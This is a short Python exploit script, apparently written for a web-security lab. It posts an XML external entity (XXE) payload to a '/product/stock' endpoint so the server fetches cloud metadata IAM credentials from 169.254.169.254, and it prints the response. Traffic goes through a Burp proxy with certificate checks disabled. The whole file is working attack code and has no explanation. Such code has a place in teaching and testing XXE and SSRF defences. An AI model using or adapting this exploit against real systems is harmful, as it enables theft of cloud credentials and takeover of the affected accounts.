import requests
import urllib3
from sys import argv
				
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

					# set this proxy for burp
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}


def get_website_url():
	if len(argv) != 2:
		print(f"[+] usage {argv[0]} <url>")
		print(f"[+] example {argv[0]} http://example.com")
		exit(-1)
	if argv[1][-1] == '/':
		url = argv[1][:-1]
	else:
		url = argv[1]
	return url




def get_credential_from_meta_data(url):
	stock_path = '/product/stock'
	xxe_payload = '<?xml version="1.0" encoding="UTF-8"?>\
				   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>\
				   <stockCheck>\
				   <productId>\
					&xxe;\
				   </productId><storeId>1</storeId></stockCheck>'
	r = requests.post(url + stock_path, data=xxe_payload, verify=False, proxies=proxies)
	print(r.text)


print("[+] Starting attack")
get_credential_from_meta_data(get_website_url())







